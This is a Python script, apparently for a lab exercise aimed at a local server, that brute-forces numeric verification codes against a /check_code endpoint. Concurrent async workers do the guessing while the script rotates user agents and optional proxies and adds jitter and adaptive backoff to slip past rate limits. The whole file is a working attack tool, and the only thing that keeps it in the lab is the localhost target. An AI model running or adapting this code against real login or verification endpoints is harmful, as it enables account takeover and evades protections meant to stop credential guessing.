#!/usr/bin/env python3
"""
Smart client with proxy rotation (local), jittered timing and adaptive throttling.
This uses an optional proxies list (local/controlled) - in lab, you can use multiple loopback ports / tiny proxies.
Run: python smart_client.py
"""
import asyncio
import aiohttp
import random
import time
import logging
from itertools import cycle

TARGET = "http://127.0.0.1:5000/check_code"
CONCURRENCY = 10
BASE_SLEEP = 0.5
MAX_CODES = 5000
START = 100000

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.85.0",
    "HTB-Lab-Agent/Smart/1.0",
    "python-requests/2.31"
]

PROXIES = []  # ex: ["http://127.0.0.1:8080", "http://127.0.0.1:8081"]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

async def try_code(session, code, proxy=None):
    headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/json"}
    payload = {"code": str(code)}
    kwargs = {}
    if proxy:
        kwargs["proxy"] = proxy
    try:
        async with session.post(TARGET, json=payload, headers=headers, timeout=10, **kwargs) as resp:
            status = resp.status
            if status == 200:
                data = await resp.json()
                if data.get("status") == "ok":
                    logging.info(f"[FOUND] code={code} response={data}")
                    return True
                return False
            elif status == 429:
                return "ratelimited"
            elif status == 503:
                return "service"
            else:
                return False
    except Exception as e:
        logging.debug(f"[ERR] {e} for code={code}")
        return "error"

async def worker(name, queue, proxy_cycle):
    async with aiohttp.ClientSession() as session:
        while True:
            code = await queue.get()
            if code is None:
                queue.task_done()
                break
            proxy = next(proxy_cycle) if PROXIES else None
            res = await try_code(session, code, proxy)
            if res is True:
                logging.info(f"Worker {name} found the code: {code}.")
                while not queue.empty():
                    try:
                        queue.get_nowait()
                        queue.task_done()
                    except asyncio.QueueEmpty:
                        break
                queue.put_nowait(None)
                queue.task_done()
                return
            # adaptive sleep with jitter
            if res in ("ratelimited", "service"):
                await asyncio.sleep(BASE_SLEEP * 4 * (1 + random.random()))
            else:
                await asyncio.sleep(BASE_SLEEP * (0.5 + random.random()))
            queue.task_done()

async def main():
    q = asyncio.Queue()
    for n in range(START, START+MAX_CODES):
        q.put_nowait(n)
    proxy_cycle = cycle(PROXIES) if PROXIES else cycle([None])
    workers = [asyncio.create_task(worker(f"w{i}", q, proxy_cycle)) for i in range(CONCURRENCY)]
    await q.join()
    for _ in workers:
        q.put_nowait(None)
    await asyncio.gather(*workers, return_exceptions=True)

if __name__ == "__main__":
    asyncio.run(main())
